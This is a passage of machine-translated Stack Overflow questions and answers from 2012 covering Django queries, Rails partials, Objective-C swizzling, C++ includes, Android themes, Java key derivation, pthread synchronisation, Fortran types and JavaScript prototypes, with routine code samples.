其他过滤操作也是 ImageFilter 模块 [1] 的一部分，并且应用方式相同。变换（旋转、调整大小）是通过调用图像对象本身的函数[2] 来处理的，即 img.resize。这个问题解决了 JPEG 质量[如何在 Python 图像库中调整调整大小的图像的质量？](https://stackoverflow.com/questions/1405602/how-to-adjust-the-quality-of-a-resized-image-in-python-imaging-library)

[1] [http://effbot.org/imagingbook/imagefilter.htm](http://effbot.org/imagingbook/imagefilter.htm)

[2] [http://effbot.org/imagingbook/image.htm](http://effbot.org/imagingbook/image.htm)

# python - X 的追随者，在单个 JOIN 查询中不包括 Y 的追随者（多对多通过）

> ID：11751465
> 
> 赞同：0
> 
> 时间：2012-08-01T01:37:30.810
> 
> 标签：python, mysql, django

我的问题的答案很可能是“这是你能做的最好的事情”，但我希望我只是看着这个太久而错过了一些东西......

参考[这篇关于不对称关系](http://charlesleifer.com/blog/self-referencing-many-many-through/)的文章，我正在查看“相互朋友关系”查询。以下是文章中的模型：

```
class Person(models.Model):
    name = models.CharField(max_length=100)
    relationships = models.ManyToManyField('self', through='Relationship', 
                                           symmetrical=False, 
                                           related_name='related_to')

    def get_friends(self):
        return self.relationships.filter(
            to_people__from_person=self,
            from_people__to_person=self)

class Relationship(models.Model):
    from_person = models.ForeignKey(Person, related_name='from_people')
    to_person = models.ForeignKey(Person, related_name='to_people') 
```

JOIN 查询中的`get_friends()`结果。

我想做的查询是“关注person_A但不关注person_B的人”。多对多的关系消除了很多工作，只留下了我的一个简单的查询要求......所以我有这个：

```
person_A.relationships\
    .filter(from_people__to_person=person_A)\
    .exclude(from_people__to_person=person_B) 
```

结果包含一个子查询：

```
SELECT `person`.`id` FROM `person` 
INNER JOIN `relationship` ON (`person`.`id` = `relationship`.`to_person_id`) 
INNER JOIN `relationship` T4 ON (`person`.`id` = T4.`from_person_id`) 
WHERE (
    `relationship`.`from_person_id` = 178  
    AND T4.`to_person_id` = 178  
    AND NOT (`person`.`id` IN (
        SELECT U1.`from_person_id` FROM `relationship` U1 
        WHERE (U1.`to_person_id` = 191  AND U1.`from_person_id` IS NOT NULL)
    ))
) 
```

这种排除查询是否意味着需要子查询，或者我只是错过了一些简单的调整？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T03:28:33.990

假设您的表格（可能是简化的）看起来类似于：

### 人：

```
id   |   name
-------------
1    |   Zane
2    |   Jeff
3    |   Troy
5    |   Steffan
6    |   Lolo
7    |   Katrina 
```

* * *

### 关系：

```
from_id   |   to_id
-------------------
1         |   5
1         |   6
2         |   5
2         |   1
2         |   5
3         |   1
5         |   1
5         |   2
7         |   5 
```

`from_id`的追随者在哪里`to_id`，一个人不能跟随他或她的自我。

我们希望*得到所有`5`不是 的追随者的追随者`1`*，我们希望得到这样的结果：

```
id   |   name
--------------
1    |   Zane
7    |   Katrina 
```

您可以使用此解决方案：

```
SELECT    a.id, a.name
FROM      person a
JOIN      relationship b ON a.id = b.from_id
LEFT JOIN (
          SELECT from_id
          FROM   relationship
          WHERE  to_id = 1
          ) c ON b.from_id = c.from_id
WHERE     b.to_id = 5 AND
          c.from_id IS NULL 
```

* * *

[*SQLFiddle 演示*](http://www.sqlfiddle.com/#!2/f6d37/1/0)

# ruby-on-rails - 从同一控制器渲染多个局部时未设置局部变量

> ID：11751468
> 
> 赞同：0
> 
> 时间：2012-08-01T01:37:58.960
> 
> 标签：ruby-on-rails, ruby-on-rails-3.2

这个bug让我很困惑。

我正在显示一个带有最后 5 个数据点的小部件和一个新数据点的表单。当我尝试渲染表单和显示部分时，它会因路由错误而失败。如果我注释掉**任何一个**部分，它就可以正常工作。因此，只有部分形式它可以工作，或者只有显示部分它可以与其他部分一起工作。

三个相关的模型/控制器：Widget、DataSet 和 DataPoint。DataPoints 是 STI，所以我有不同的部分来显示与类名匹配的不同类型。

当两者`render :partial => ...`都未注释时，看起来好像传递给第二个部分的 data_point 与传递给第一个部分的 data_point 相同。只有一个 data_set_id 全部为零。我尝试将本地从 :data_point 重命名为 :dp 以防发生名称冲突。

查看底部显示的部分和路由错误。

当您尝试在视图中渲染多个部分时，将 :locals 传递给部分是否有限制？

## 查看：show.html.haml（控制器上的show动作为空）

```
- title "#{@widget.type.underscore.humanize} for #{@widget.data_set.name.to_s.downcase}"

.row

  .span6
    = render :partial => 'data_points/form', :locals => { :data_set => @widget.data_set, :data_point => @widget.data_set.data_points.build }
    %br
    - last_5 = @widget.data_set.data_points.last(5)
    - if last_5.count > 0
      %h3= "Last #{pluralize( last_5.count, 'Entry' )}"
      - last_5.each do |dp|
        %pre
          = dp.inspect
        = render :partial => "data_points/#{@widget.data_set.data_type.underscore}", :locals => { :data_set => @widget.data_set, :data_point => dp }
    - else
      %h3 No data yet!

    = form_tag( push_widget_path @widget, :method => 'POST' ) do
      = submit_tag( "Push Data", :class=>"btn btn-primary" )
      = link_to "Edit your data", data_set_path( @widget.data_set ), :class=>'btn'

  .span6
    = image_tag "widgets/#{@widget.type.underscore}.png"
    %p
      Using the 
      %b= link_to @widget.data_set.name, @widget.data_set
      data set.

      = render :partial => "widgets/#{@widget[:type].underscore}", :locals => { :widget => @widget } rescue nil
    %p
      = link_to 'Edit', edit_widget_path(@widget), :class=>'btn' 
```

# 表单部分 (data_points/_form.html.haml)

```
%pre
  = data_set.inspect
%pre
  = data_point.inspect
= form_for [data_set,data_point], :html=>{:class => 'well form-horizontal'} do |f|
  -if data_point.errors.any?
    #error_explanation
      %h2= "#{pluralize(data_point.errors.count, "error")} prohibited this data_point from being saved:"
      %ul
        - data_point.errors.full_messages.each do |msg|
          %li= msg
  = render :partial => "data_points/#{data_set.data_type.underscore}_form", :locals => { :f => f, :data_point => data_point, :data_set => data_set }
  = f.text_field :created_at, :type=>'datetime'
  .form-actions
    = f.submit 'Save' 
```

# 显示部分 (data_points/_multi_value_data_point.html.haml)

```
.data-point{ :id=>"data-point-#{data_point.id}"}
  %span.value 
    - data_point.data.map do |k,v|
      - label = data_set.properties[:data_series][k][:name]
      %span.key= "#{label}: "
      = v
  .meta
    = data_point.created_at 
    %span.edit
      = link_to 'Edit', edit_data_set_data_point_path( data_set, data_point )
    %span.delete
      = link_to 'Destroy', [data_set, data_point], :method => :delete, :data => {:confirm => 'Are you sure?'}
    =# link_to 'Edit', '#', id: "edit-data-point-#{data_point.id}"
    :javascript
      $("#edit-data-point-#{data_point.id}").click( function(e) {
        $("#data-point-#{data_point.id}").html( "#{escape_javascript( render :partial => "data_points/multi_value_data_point_form", :locals => { data_set: data_set, data_point: data_point } )}");
        return false;
      }); 
```

# 路由错误

```
Routing Error

No route matches {:action=>"edit", :controller=>"data_points", :data_set_id=>#<MultiValueDataSet id: 4, ... properties removed ... type: "MultiValueDataSet">, :id=>#<DataPoint id: nil, data: {}, data_set_id: 4, created_at: nil, updated_at: nil>}
Try running rake routes for more information on available routes. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T01:56:10.777

问题源于表单正在构建一个未保存的新元素，最后返回未保存的元素。

简单的解决方案，将 .last(5) 替换为 .find( :all, order: 'id desc', limit: 5 )

# objective-c - 有没有办法对 NSArray （或其他类集群）进行猴子补丁或调配？

> ID：11751473
> 
> 赞同：4
> 
> 时间：2012-08-01T01:38:33.563
> 
> 标签：objective-c, cocoa, nsarray, monkeypatching, swizzling

今天我正在做一个项目，我想为 的所有实例“别名”一种替代方法，并且认为使用一些[好的老式方法调配](http://www.google.com/search?q=method%20Swizzling)`NSArray`不会太困难。

我爆发了[JRSwizzle](https://github.com/rentzsch/jrswizzle.git)，然后……</p>

`[NSArray jr_swizzleMethod:@selector(objectAtIndex:) withMethod:@selector(objectAtIndex_accordingToMe:) error:nil];`

为了清楚起见，我将它与适当的类别 on 配对`NSArray`，一个名为 的实例方法`objectAtIndex_accordingToMe:`。

但是，我只是*在同一个旧索引处得到同一个旧对象*。叹。最终，我发现尽管没有抛出任何错误——我不会实现这些结果[，因为它`NSArray`是一个类集群](https://stackoverflow.com/a/7218794/547214)

`NSArray`我想我的问题更多是不愿意接受“这”真的是试图覆盖方法的尽头。我的意思是，来吧这是`NSArray`..人们一定想搞砸它，不是吗？人们*会认为*Apple 的基础课程将成为各地调酒师的主要目标！

那么，有没有办法改变、别名、[monkey-patch](http://en.wikipedia.org/wiki/Monkey_patch)、覆盖或以其他方式使用...... NSArray 等（没有子类化）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T02:06:56.573

这不仅仅是一个类集群。`NSArray`已免费桥接到`CFArray`，并且您无法调配 Core Foundation。因此，这通常不太可能起作用。

但是你想解决什么问题？如果要添加新方法，请使用类别。他们在类集群上工作得很好。修改 NSArray 上某些内置的行为似乎是灾难的秘诀（有趣，因为它可能是一个练习）。

在*走得太远*之前，您可能至少想看看[CFArray.c](http://opensource.apple.com/source/CF/CF-635.21/CFArray.c)并了解一些底层内容是如何实现的。

* * *

编辑：虽然我永远不会在生产代码中这样做，但您可以通过使用 ISA-swizzling 劫持单个数组实例来获得一些您想要的东西。有关一些示例代码，请参阅[ISAwizzle](https://github.com/rnapier/ios5ptl/tree/master/ch20/ISASwizzle)。代码解释在[iOS:PTL](http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118818342.html)的第 20 章。搜索“isa swizzle”，您应该可以在网上找到更多信息。这就是 KVO 的实现方式。但是使用 NSArray ......哇，那一定很脆弱。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-01T02:06:13.163

大概你有一个你想要这种行为的特定数组。无论它是什么，您都可以获取该实例的类对象，并且可以很容易地进行调整：

```
[[myArray class] jr_swizzleMethod:@selector(objectAtIndex:) withMethod:@selector(objectAtIndex_accordingToMe:) error:nil]; 
```

也只有几个具体的子类`NSArray`：

```
NSArray * trees = [NSArray array];
NSArray * birds = [NSArray arrayWithObjects:@"Albatross", @"Budgerigar", @"Cardinal", nil];
NSMutableArray * dogs = [NSMutableArray arrayWithObjects:@"Airedale", @"Beagle", @"Collie", nil];

NSLog(@"%@ %@ %@", [trees class], [birds class], [dogs class]); 
```

我们得到`__NSArrayI`了前两个和`__NSArrayM`第三个，所以*可能*（这是*非常*脆弱的）您可以使用运行时函数按名称获取类对象：

```
[objc_getClass("__NSArrayI") jr_swizzleMethod:@selector(objectAtIndex:) withMethod:@selector(objectAtIndex_accordingToMe:) error:nil]; 
```

# javascript - 寻找一个可以嵌入到我的网站的简单 javascript HTML GUI 构建器

> ID：11751482
> 
> 赞同：0
> 
> 时间：2012-08-01T01:39:29.613
> 
> 标签：javascript, jquery, html, user-interface

我有一个广告网站，我正在寻找可以让我的用户轻松构建自己的自定义广告的片段或网络应用程序。它需要有一个简单的界面，并且应该有简单的对象可以插入，例如图像、div 和带有字体选项的文本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T01:43:33.540

您正在寻找的是所谓的“所见即所得编辑器”。最著名的：TinyMCE 和 CKEditor。

[http://www.turnkeylinux.org/blog/tinymce-vs-ckeditor](http://www.turnkeylinux.org/blog/tinymce-vs-ckeditor)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T10:53:06.583

[SPABuilder](http://spabuilder.appspot.com/)或[Ext Gui Builder](http://tof2k.com/ext/formbuilder/)，后者看起来要好得多。请注意，他们引入了自己的一组小部件，如果您想要这种类型的应用程序，这是必须的。这些仍然有一个学习曲线，但我看不出如果没有脑机接口或魔法，你怎么能消除它。

因此，如果您想要一组任意的小部件，您可能需要自己编写一些东西，尽管您可能会幸运地重新设置上述工具呈现的元素。

# cryptography - 通过 AT 命令获取加密算法

> ID：11751483
> 
> 赞同：0
> 
> 时间：2012-08-01T01:39:30.627
> 
> 标签：cryptography, gsm, modem, at-command

我正在尝试通过 AT 命令获取电话当前使用的加密算法。通常是 A5/1 或 A5/0。有没有人遇到过类似的情况？你知道任何其他方法来获得算法吗？

提前致谢。

# c++ - Qt c++聚合'std :: stringstream ss'类型不完整，无法定义

> ID：11751486
> 
> 赞同：107
> 
> 时间：2012-08-01T01:40:00.967
> 
> 标签：c++, string, qt, stringstream

我的程序中有这个函数可以将整数转换为字符串：

```
 QString Stats_Manager::convertInt(int num)
    {
        stringstream ss;
        ss << num;
        return ss.str();
    } 
```

但是当我运行这个时，我得到了错误：

```
aggregate 'std::stringstream ss' has incomplete type and cannot be defined 
```

我不太确定那是什么意思。但是，如果您知道如何修复它或需要更多代码，请发表评论。谢谢。

* * *

## 回答 #1

> 赞同：167
> 
> 时间：2012-08-01T01:46:11.837

你可能有一个类的前向声明，但没有包含标题：

```
#include <sstream>

//...
QString Stats_Manager::convertInt(int num)
{
    std::stringstream ss;   // <-- also note namespace qualification
    ss << num;
    return ss.str();
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-08-01T01:50:40.573

就像上面写的一样，你忘记输入`#include <sstream>`

```
#include <sstream>
using namespace std;

QString Stats_Manager::convertInt(int num)
{
   stringstream ss;
   ss << num;
   return ss.str();
} 
```

您还可以使用其他一些方式转换`int`为`string`，例如

```
char numstr[21]; // enough to hold all numbers up to 64-bits
sprintf(numstr, "%d", age);
result = name + numstr; 
```

检查[这个！](https://stackoverflow.com/questions/191757/c-concatenate-string-and-int)

# java - For Each Loop 返回搜索字符串

> ID：11751490
> 
> 赞同：0
> 
> 时间：2012-08-01T01:40:28.613
> 
> 标签：java, foreach, arraylist

我的 JAVA 命令行菜单有问题。这就是我所拥有的......我想做的是在评论中。

```
 private void listStudents(){
    out.println("\n\tStudent Listing");
    //Call datastore method that returns all student names as an array of strings
    String[] list = data.getStudents();
    //Display all names (use foreach statement)
    for (String name : list) {

    }
} 
```

这是我也坚持使用的数据存储方法...

```
 String[] getStudents() {
    return (String[]) students.toArray();
}

// Method to return students who match search term
String[] findStudents(String searchTerms) {
// Use foreach loop to visit each item in students ArrayList,
// and if the name matches the search term, add it to a new ArraList.
// Then return the new ArrayList as a string array (see getStudents)
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T01:55:01.527

不确定这是否正是您所需要的，但根据我从您的评论中了解到的情况，请尝试使用以下内容：

```
private void listStudents()
{
    System.out.println("\n\tStudent Listing");

    String[] list = data.getStudents();

    // List each student.
    for (String name : list)
        System.out.println(name);
}

private String[] findStudents(String searchTerms)
{
    List<String> studentsFound = new ArrayList<String>();

    for (String student : students)
    {
        // Determine if matching student found.
        if (student.equals(searchTerms))
            studentsFound.add(student);
    }

    return studentsFound.toArray(new String[0]);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:46:44.187

你还没有定义什么是`searchterms`可能的。是正则表达式吗？是通配符吗？

```
public String[] findStudents(String searchTerms) {
    List<String> findList = new ArrayList<String>(25);
    for (String student : students) {

        // Now you'll need to define how the match works,
        // Are you using a regexp or some kind of other matching
        // algorithm..
        boolean match = ...;
        if (match) {

            findList.add(student);

        }

    }

    return findList.toArray(new String[findList.size()]);
} 
```

# java - 如何更改 PreferenceActivity 主题？

> ID：11751498
> 
> 赞同：13
> 
> 时间：2012-08-01T01:41:56.897
> 
> 标签：java, android

我正在尝试在我的应用程序中更改 PreferenceActivity 的主题，但我无法让它工作。

这是xml：

```
 <?xml version="1.0" encoding="utf-8"?>
<PreferenceScreen xmlns:android="http://schemas.android.com/apk/res/android" >

        <SwitchPreference android:title="Auto Clear" android:key="autoclear" android:summary="Clear the command line when the code is being executed." android:defaultValue="false"/>
        <ListPreference android:title="Choose a theme" android:negativeButtonText="" android:dialogTitle="" android:key="theme" android:entries="@array/themesList" android:entryValues="@array/themesList" android:defaultValue="Default" />

</PreferenceScreen> 
```

这是 PreferenceActivity：

```
 @Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);

    this.setTheme(R.style.AppTheme);

    addPreferencesFromResource(R.xml.preferences);

} 
```

结果是：

![结果](../Images/cef5ba88ff06e109f5a98e6a4bcbec49.png)

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-08-01T01:48:24.363

您是否尝试在清单中的活动标签上应用主题？这就是我之前的做法-

```
<activity 
  android:label="@string/app_name" 
  android:name="com.example.MyPreferenceActivity"
  android:theme="@android:style/Theme.Black"
  android:exported="true"
  android:icon="@drawable/ic_launcher"></activity> 
```

**编辑：**

您可以尝试的另一个选项是覆盖`onApplyThemeResource(Resources.Theme theme, int resid, boolean first)`. 查看 android 源代码 setTheme 将在内部调用方法。

```
/**
 * Called by {@link #setTheme} and {@link #getTheme} to apply a theme
 * resource to the current Theme object.  Can override to change the
 * default (simple) behavior.  This method will not be called in multiple
 * threads simultaneously.
 *
 * @param theme The Theme object being modified.
 * @param resid The theme style resource being applied to <var>theme</var>.
 * @param first Set to true if this is the first time a style is being
 *              applied to <var>theme</var>.
 */
protected void onApplyThemeResource(Resources.Theme theme, int resid, boolean first) {
    theme.applyStyle(resid, true);
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-03-27T10:11:52.010

最后我发现了如何以编程方式更改“PreferenceActivity”的主题（通过java代码）

要更改主题，只需这样做：

```
 @Override
        public void onCreate(Bundle savedInstanceState) {
        setTheme(R.style.Holo_Theme_Light);
        super.onCreate(savedInstanceState);
        } 
```

总是`setTheme(R.style.yourtheme);`在方法之前调用`super.onCreate(savedInstanceState);`方法。通过这样做，它将产生如下所示的结果。

![在此处输入图像描述](../Images/e92db99295f28818d86be188bb67b13f.png)

就这样。

`setTheme(R.style.yourtheme);`如果你在方法之后调用方法`super.onCreate(savedInstanceState);`，它将产生如下所示的结果。

![在此处输入图像描述](../Images/805a720049e2cef3c647a8dcf33def1a.png)

注意：嵌套的 PreferenceScreen 无法识别主题。要将主题应用于该嵌套的 PreferenceScreen，您必须为该嵌套的 PreferenceScreen 创建另一个 PreferenceActivity 并`setTheme(R.style.yourtheme);`在那里调用方法。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-01T09:44:05.790

如果你想改变背景，你可以使用

```
public class FractalPreferenceActivity extends PreferenceActivity  {
   .......

    @Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    getWindow().setBackgroundDrawableResource(R.drawable.gradient); 
    getListView().setBackgroundColor(Color.TRANSPARENT); 
    getListView().setCacheColorHint(Color.TRANSPARENT); 

           .......
    } 
```

}

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-12T10:28:04.777

我个人使用这种方法：对于 11 以下的 API，我使用（值目录，themes.xml 文件）：

```
 <?xml version="1.0" encoding="utf-8"?>
<resources>

    <style name="MyTheme" parent="@android:style/Theme.Light.NoTitleBar"></style>

</resources> 
```

对于更高版本（例如 values-v14 目录、themes.xml 文件）：

```
 <?xml version="1.0" encoding="utf-8"?>
<resources>

    <style name="MyTheme" parent="@android:style/Theme.Holo.Light.NoActionBar"></style>

</resources> 
```

并表现：

```
 <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" > 
```

Android 会根据设备的 API 自动选择主题，无需在活动（清单）或代码中的语法上指定任何主题...

![主题](../Images/677ecbe9f47f5627ed30e025cb3d25c9.png)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-05-18T06:12:46.510

这听起来很愚蠢，但 using`setTheme()`将适用于您的所有片段，但不是主要的偏好活动。在清单文件中设置它，它会突然开始工作。

我根据用户偏好动态设置主题，`setTheme()`在 from 主题管理器对象之前调用`onCreate`（它还提供各种颜色，`drawables`并且可以通过我不想在样式中设置的主题进行更改......主要是因为它太混乱了弄清楚什么是什么）。

不知道为什么在清单中设置它会`setTheme()`起作用。我猜只是一些特定于偏好活动的故障。

# iphone - xcode升级后“格式字符串未使用数据参数”错误

> ID：11751500
> 
> 赞同：0
> 
> 时间：2012-08-01T01:42:10.743
> 
> 标签：iphone, ios, xcode

```
#define IMAGE_PATH @"/Users/jinyoung85/Desktop/test1" 
```

升级 xcode 4.4 后，up code has (data argument not used by format string ) 错误。

为什么？我该如何解决这个问题？

# java - PBEKeySpec 可以在 Java 中重用吗？

> ID：11751511
> 
> 赞同：1
> 
> 时间：2012-08-01T01:43:28.780
> 
> 标签：java, encryption, aes

使用相同的 IV、key、iteration 和 salt 作为输入，每次生成的 PBEKeySpec 是否相同？那是：

```
SecretKeyFactory factory = SecretKeyFactory.getInstance("PBEWithSHA256And256BitAES-CBC-BC");
KeySpec spec = new PBEKeySpec(secureKey.toCharArray(), SALT.getBytes(), KEY_ITERATION, KEY_LENGTH);
SecretKey tmp = factory.generateSecret(spec);
SecretKey secret = new SecretKeySpec(tmp.getEncoded(), "AES"); 
```

我每次都会得到相同的 SecretKey 吗？我只是担心当用户下次启动程序时，SecretKey 对象被更改并且不能用于解密该值。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T01:55:07.160

是的。只要输入和算法按照您在问题中指定的方式固定，它将继续在给定相同输入的情况下生成相同的密钥。您应该能够通过在循环中运行代码并每次打印来测试这一点

```
System.out.println(Arrays.toString(secret.getEncoded)); 
```

此外，API 指定了除密码之外的不可变对象。对于密码 (a `char[]`)，API 指定*用户*可以在 PBE 操作后覆盖该值。

请注意，原则上派生自的类`SecretKeySpec`可以实现可变接口。`SecretKeySpec`然而，扩展、可变并且 keyfactory 类或任何其他类将改变内容的可能性极小。

# c++ - 什么时候使用 pthread 屏障而不是条件等待和广播更合适？

> ID：11751514
> 
> 赞同：3
> 
> 时间：2012-08-01T01:44:14.250
> 
> 标签：c++, pthreads

我正在用 C++ 编写遥测系统，并且在将某些线程与标准 pthread_cond_timedwait 和 pthread_cond_broadcast 同步时遇到了一些困难。

问题是我需要一些方法让正在广播的函数知道另一个线程是否对广播起作用。

经过一番认真的搜索后，我决定我可以尝试为这两个线程使用屏障。但是，我仍然想要 pthread_cond_timedwait 的超时功能。

这基本上是我想出的：（但是感觉有点过分了）

**侦听功能：**检查一段时间以查看当前是否正在触发事件。

```
bool listen(uint8_t eventID, int timeout)
{  
    int waitCount = 0;  
    while(waitCount <= timeout)
    {  
        globalEventID = eventID;
        if(getUpdateFlag(eventID) == true)
        {
            pthread_barrier_wait(&barEvent);
            return true;
        }
        threadSleep(); //blocks for 1 millisecond
        ++waitCount;
    }
    return false;
} 
```

**触发功能：**通过设置触发周期的更新标志来触发一个毫秒周期的事件

```
bool trigger(uint8_t eventID, int timeout)
    int waitCount = 0;  
    while(waitCount <= timeout)
    {  
        setUpdateFlag(eventID, true); //Sets the update flag to true
        if(globalEventID == eventID)
        {
            pthread_barrier_wait(&barEvent);
            return true;
        }
        threadSleep(); //blocks for 1 millisecond
        ++waitCount;
    }
    setUpdateFlag(eventID, false);
    return false;
} 
```

我的问题：是与广播公司共享信息的另一种方式，还是障碍真的是唯一有效的方式？另外，是否有另一种方法可以通过障碍获得超时功能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T10:59:30.767

根据您描述的问题：

> 具体来说，我试图让 thread1 知道它正在等待的消息已被 thread2 解析并存储在全局列表中，并且 thread2 可以继续解析和存储，因为 thread1 现在将从列表中复制该消息，确保 thread2 可以用新版本覆盖该消息，并且不中断 thread1 的操作。

听起来您的问题可以通过让两个线程交替等待条件变量来解决。例如。在线程 1 中：

```
pthread_mutex_lock(&mutex);
while (!message_present)
    pthread_cond_wait(&cond, &mutex);
copy_message();
message_present = 0;
pthread_cond_broadcast(&cond);
pthread_mutex_unlock(&mutex);

process_message(); 
```

在线程 2 中：

```
parse_message();

pthread_mutex_lock(&mutex);
while (message_present)
    pthread_cond_wait(&cond, &mutex);
store_message();
message_present = 1;
pthread_cond_broadcast(&cond);
pthread_mutex_unlock(&mutex); 
```

# objective-c - 针对几个不同的字符串测试文本字段的内容

> ID：11751516
> 
> 赞同：0
> 
> 时间：2012-08-01T01:44:24.897
> 
> 标签：objective-c, string, cocoa

我无法弄清楚如何检查文本字段是否包含几个不同字符串中的任何一个。这就是我所拥有的，但它不起作用：

```
- (IBAction)Submit:(id)sender { 

    if ([Input.text isEqualToString:@"axe"/"apple"/"angry"])
        Output.text = @"CORRECT";
    else Output.text = @"INCORRECT"; 
```

如果输入文本字段包含“axe”、“apple”或“angry”，则输出标签应显示“CORRECT”，否则应显示“INCORRECT”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T01:49:28.763

我认为这就是您在问题结尾所说的话中想要的：

> 如果输入文本字段 = axe、apple 或anger，则输出标签 = 正确，但如果不是，则输出标签 = 不正确。

所以这是代码：

```
if([Input.text isEqualToString:@"axe"] || [Input.text isEqualToString:@"apple"] || [Input.text isEqualToString:@"angry"]) {

    Output.text = @"CORRECT";
}
else {
    Output.text = @"INCORRECT";
} 
```

您正在寻找“或”运算符，即“||”。

你还说：

> 我很难找出是否有办法将多个单词编译成同一个字符串。

为此，您可以尝试以下操作：

```
NSString *str1 = @"axe";
NSString *str2 = @"apple";
NSString *str3 = @"angry";
NSString *combined = [NSString stringWithFormat:@"%@ %@ %@", str1, str2, str3]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-19T18:13:15.023

我会建议一种稍微不同的方法：

```
// Create an array with all of the acceptable words:
NSArray *correctWords = [NSArray arrayWithObjects:@"axe", 
                                                  @"apple", 
                                                  @"angry", nil];

// Check to see if the input text matches one of the correct words 
// (stored in the array), and set the Output text:
if ([correctWords containsObject:Input.text]) {
    Output.text = @"CORRECT";
} else {
    Output.text = @"INCORRECT";
} 
```

# oop - 具有抽象类型组件的 Fortran 派生类型

> ID：11751517
> 
> 赞同：2
> 
> 时间：2012-08-01T01:44:34.257
> 
> 标签：oop, design-patterns, fortran, abstract-class, type-extension

在 fortran 2003 中，是否可以定义具有抽象类型组件的派生类型？例如，如下所示，我想定义一个`Sup`具有类型组件`o_Abst`的`Abst`类型。

```
TYPE, ABSTRACT :: Abst
 CONTAINS 
   PROCEDURE(some_proc), deferred, pass :: some_proc 
   ..
END TYPE Abst

TYPE :: Sup
   PRIVATE
   CLASS(Abst) :: o_Abst
   ..
 CONTAINS
   PROCEDURE :: another_proc
END TYPE Sup 
```

我已经遇到的一个问题是为`Sup`类型对象编写构造函数。我无法`o_Abst`通过内部赋值为组件赋值`=`（英特尔编译器说，“在内部赋值语句中，变量不应是多态的。”）。或者我不能为`Abst`类型对象编写构造函数，因为据我所知，如果传递的对象虚拟参数以外的参数是抽象类型，则无法正确覆盖延迟的类型绑定过程。

我也很高兴听到有关避免使用类似`Sup`. 如果很想用抽象类型的组件来定义一个类型，那么通常有哪些替代策略？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-01T03:05:16.030

派生类型可能具有具有抽象声明类型的多态组件。组件必须具有指针属性或可分配属性。

F2003 中不允许对多态对象进行内在分配（如果分配给的对象具有可分配属性，则在 F2008 中允许，但 ifort 12.1 不支持该属性）。在 F2003 中，可以使用带有 SOURCE 说明符的 ALLOCATE 语句来获得或多或少相同的结果。

您可以构造具有非抽象扩展`Abst`类型的对象（对象的动态类型是抽象的没有意义，因此`Abst`本身不存在结构构造函数）。对于绑定到采用一个或多个抽象类型参数的类型的过程没有限制。

# javascript - JavaScript 原型继承？

> ID：11751534
> 
> 赞同：0
> 
> 时间：2012-08-01T01:46:53.167
> 
> 标签：javascript

```
var pluginProto = m[0].prototype;
var cnds = pluginProto.cnds;
if (position_aces)
{
    cnds.CompareX = function (cmp, x)
    {
        return cr.do_cmp(this.x, cmp, x);
    };
} 
```

我认为上面的代码应该以相反的方式继承它们的值。

```
(define var cnds -> var pluginProto.cnds = cnd -> m[0]prototype = pluginProto) 
```

而且我仍然想知道上面的代码如何可以毫无问题地将它们的值继承到 m[0]prototype 。

关于原型继承，我缺少什么？原型能否引用任何值而不受创建值的时间限制？

# javascript - 使用框架/语言中的 getter/setter 或定义您自己的显式

> ID：11751535
> 
> 赞同：0
> 
> 时间：2012-08-01T01:47:11.477
> 
> 标签：javascript, node.js, design-patterns, coding-style

在我作为实习生工作的地方，使用 Backbone.JS 处理 JavaScript 前端项目，我使用的是框架（Backbone）提供的那些 getter 和 setter，但被要求定义我自己的以明确什么是公共/私有. 我更喜欢使用主干提供的那些。这里有什么更好的做法或推荐的方法？

然后最近，我正在开发自己的 ExpressJS/Mongoose 应用程序，我开始认为我定义了一个`Todo`模型，然后是一个`Todos`公开函数的集合`byId`，`byList`等等，但后来我想也许我应该只使用 Mongoose 提供的那些？

使用提供的 getter/setter 的好处是

*   更少的代码，更少的错误
*   获取/设置的标准方式。而不是 2（来自框架 + 自定义）
*   另一个开发人员只需要学习框架而不是我的自定义代码来了解发生了什么

缺点：

*   更长一点的代码
*   不太了解什么是私人的，什么不是，但我认为这不是很重要......尤其是在动态语言中

再次，这里推荐什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T16:34:48.633

如果框架允许，请仅在必须修改默认 getter/setter 的行为时编写自己的 getter/setter。

如果不需要，没有理由写它们，恕我直言。

# google-chrome-extension - 卸载 chrome 扩展和相关的 localStorage

> ID：11751536
> 
> 赞同：0
> 
> 时间：2012-08-01T01:47:26.300
> 
> 标签：google-chrome-extension, local-storage

我正在开发模式下测试 chrome 扩展。完成后，我将其打包并安装在我的机器上！这是工作。但是我不确定当我从浏览器（开发模式）卸载扩展时是否删除了旧的 localStorage。

从开发模式卸载扩展并安装与打包扩展相同的东西时，关联的 localStorage 是否会被删除？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T09:53:15.453

卸载扩展程序时，将删除与扩展程序相关的所有数据。您可以通过访问您的 Chrome 配置文件目录来验证这一点，然后进入`Local Storage`. 您将看到一个 SQLLite 数据库（例如`chrome-extension_lndfmdleiloedhcbmjofibnflfbjhpha_0.localstorage`）。

删除扩展后，此数据库将消失。

# android - Surfaceview 骨架教程问题

> ID：11751538
> 
> 赞同：2
> 
